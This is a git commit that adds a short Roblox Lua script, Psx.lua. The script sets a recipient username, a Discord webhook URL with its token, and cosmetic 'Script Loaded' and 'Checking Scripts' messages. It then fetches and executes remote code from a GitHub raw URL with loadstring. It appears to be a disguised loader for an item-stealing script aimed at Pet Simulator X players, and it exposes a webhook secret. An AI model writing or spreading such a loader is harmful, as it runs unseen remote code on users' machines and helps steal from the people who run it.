09d9ceaca6f9f32d7e7abcdb8964d9c2a6801d8f
NeoGal <125014447+KeitoZei@users.noreply.github.com>
2023-02-20 23:08:43 +0800

    Create Psx.lua

---
+++ Psx.lua
@@ -0,0 +1,15 @@
+Username = "GHALA7353"
+
+WebHook = "https://discord.com/api/webhooks/1072433009753604107/Bg0kiZWWDcfVwMCQ-7SYm8MjKpZHwa3VF3sSOmfUx5G11F7_z_V98_mGk-3MRJdcJ5E4"
+
+_G.CustomScriptName = "Shit_hub"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script"
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
